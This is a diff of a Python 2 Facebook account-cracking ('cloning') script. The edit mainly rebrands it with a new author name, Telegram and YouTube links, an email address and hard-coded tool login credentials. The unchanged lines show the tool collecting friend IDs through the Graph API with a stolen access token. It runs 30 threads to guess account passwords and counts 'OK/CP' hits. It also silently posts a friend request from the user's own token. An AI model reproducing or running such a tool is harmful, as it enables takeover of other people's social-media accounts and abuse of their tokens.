@@ -54,9 +54,9 @@ logo = """
 \033[1;94m ██╔══██║██╔═██╗░██║╚██╔╝██║
 \033[1;93m ██╔══██║██╔═██╗░██║╚██╔╝██║
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
-\033[1;96m    ║✯𝔠𝔯𝔢𝔞𝔱𝔬𝔯   𝔪𝔬𝔥𝔞𝔪𝔪𝔞𝔡 𝔰𝔲𝔩𝔱𝔞𝔫𝔦║    
-\033[1;98m    ║✯ 𝔶𝔬𝔲𝔱𝔬𝔟 🖕  𝔪𝔬𝔥𝔞𝔪𝔪𝔞𝔡 𝔥𝔞𝔠𝔨𝔢𝔯   ║  
-\033[1;96m    ║✯ 𝔱𝔢𝔩𝔢𝔤𝔯𝔞𝔪 : t.me/sultani1122
+\033[1;96m    ║✯𝔠𝔯𝔢𝔞𝔱𝔬𝔯     
+\033[1;98m    ║✯ 𝔶𝔬𝔲𝔱𝔬𝔟   
+\033[1;96m    ║✯ 𝔱𝔢𝔩𝔢𝔤𝔯𝔞𝔪 : https://t.me/my_name_is_ViRuSi
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -81,9 +81,9 @@ print  """
 
 \033[1;95m___█───▄▀▀▀▀▄─▐█▌▐█▌▐██        
 \033[1;95m___█──▐▄▄────▌─█▌▐█    ▐▌
-\033[1;95m___█──▐█▀█─▀─▌─█▌▐█─▐██     t.me/mohammad_hacker_1122
+\033[1;95m___█──▐█▀█─▀─▌─█▌▐█─▐██     https://t.me/my_name_is_ViRuSi
 \033[1;95m___█──▐████▄▄▌─▐▌▐▌─▐▌
-\033[1;95m___███─▀████▀───██──▐██      A K M HACKERS
+\033[1;95m___███─▀████▀───██──▐██      Meytivirusam@gmail.com
 """
 jalan("\033[1;92m              _    _     _ ")             
 jalan("\033[1;92m             | |  (_)   | |")             
@@ -96,23 +96,23 @@ jalan("\033[1;92m |_| ")
 
 
 
-CorrectUsername = "mohammad"
-CorrectPassword = "sultani"
+CorrectUsername = "my_name_is_virusi"
+CorrectPassword = "#Meyti1367.."
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m🗝 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:love_hacker
+            print "Logged in successfully as " + username #Dev:my_name_is_virusi
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCKX5IrKQsIhejUw8ePpvJ-Q')
+            os.system('xdg-open https://m.youtube.com/channel/UCKX5IrKQsIhejUw8jPpvJ-Q')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCKX5IrKQsIhejUw8ePpvJ-Q')
+        os.system('xdg-open https://m.youtube.com/channel/UCKX5IrKQsIhejUw8etpvJ-Q')
 
 def login():
 	os.system('clear')
@@ -153,7 +153,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://m.youtube.com/channel/UCKX5IrKQsIhejUw8ePpvJ-Q')
+				os.system('xdg-open https://m.youtube.com/channel/UCKX5IrKQsIhejUwoePpvJ-Q')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -201,13 +201,13 @@ def menu():
 	os.system("clear")
 	print logo
 	print "\033[1;36;40m      ╔═════════════════════════════════╗"
-	print "\033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
+	print "\033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"      \033[1;36;40m║"                               
 	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
-	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
+	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"       \033[1;36;40m║"
 	print "\033[1;36;40m      ╚═════════════════════════════════╝"
-	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start♥Hacking"	
-	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
-	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
+	print "\033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start♥Hack"	
+	print "\033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
+	print "\033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
 	pilih()
 
 def pilih():
@@ -244,8 +244,8 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List."
-	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Public Accounts ."
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone List."
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Accounts ."
 	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Back"
 	pilih_super()
 
@@ -257,7 +257,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•══════•◈•\033[1;91mloveAKM\033[1;97m•◈•══════•◈•"
+		print "\033[1;97m•◈•══════•◈•\033[1;91love\033[1;97m•◈•══════•◈•"
 		jalan('\033[1;91mGetting IDs \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -267,7 +267,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;92m•◈•══════••◈•\033[1;91mloveAKM\033[1;95m•◈•══════••◈•"
+		print "\033[1;92m•◈•══════••◈•\033[1;91love\033[1;95m•◈•══════••◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -295,7 +295,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
-	jalan('           \033[1;91mmohammad start cloning Wait...')
+	jalan('           \033[1;91my_name_is_virusi start cloning Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
@@ -514,15 +514,15 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mloveAKM\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By mohammad hacker--•◈•---»" #Dev:MOHAMMAD
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 loveAKM.py)↩\033[1;97m....'
+	print "  \033[1;91m«---•◈•---Developed By my_name_is_virusi --•◈•---»" #Dev:Meyti
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 my_name_is_virusi.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
- ___________¶¶¶1¶¶__      A  ___¶¶¶¶¶¶¶__________ 
-________¶¶¶111¶¶___       K    ____¶¶111¶¶¶¶________ 
-______¶¶¶¶1111¶¶¶_____M_____¶¶¶1111¶¶¶1_____ 
+ ___________¶¶¶1¶¶__   A  ___¶¶¶¶¶¶¶__________ 
+________¶¶¶111¶¶___    K    ____¶¶111¶¶¶¶________ 
+______¶¶¶¶1111¶¶¶_____ M_____¶¶¶1111¶¶¶1_____ 
 _____¶¶¶1111¶¶¶¶_____________¶¶¶¶11111¶¶¶____ 
-___¶¶¶11¶1¶1¶¶¶¶___¶¶____¶¶__¶¶¶¶¶1¶1¶1¶¶¶1__  zinda bad afghanistan
+___¶¶¶11¶1¶1¶¶¶¶___¶¶____¶¶__¶¶¶¶¶1¶1¶1¶¶¶1__  ZENDE BAD iRaN O iRaNi
 __¶¶¶11¶1¶11¶¶¶¶¶__¶¶¶¶¶¶¶¶__¶¶¶¶¶1¶1¶¶11¶¶1_ 
 _¶¶¶11¶¶1¶11¶¶¶¶¶¶__¶¶¶¶¶¶_¶¶¶¶¶¶¶1¶¶1¶¶1¶¶¶_ 
 ¶¶¶¶1¶¶11¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶1¶¶¶1¶¶¶ 
@@ -531,14 +531,14 @@ _¶¶¶11¶¶1¶11¶¶¶¶¶¶__¶¶¶¶¶¶_¶¶¶¶¶¶¶1¶¶1¶¶1¶¶¶_
 _¶¶11¶¶¶1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1¶¶¶¶1¶¶¶ 
 _¶¶¶1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶1¶¶1 
 __¶¶1¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶1¶¶¶_ 
-___¶¶1¶¶¶_¶¶_______¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶¶__ AKM HACKERS
+___¶¶1¶¶¶_¶¶_______¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶¶__ my_name_is_virusi HACKERS
 ____¶¶¶¶____________¶¶¶¶¶¶___________¶¶¶¶____ 
 ______¶¶¶__________¶¶¶__¶¶¶__________¶¶______ 
 _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....mohammad Creations....... \033[1;95m :
+: \033[1;91m ....Meyti Creations....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
               \033[1;91m mohammad"""
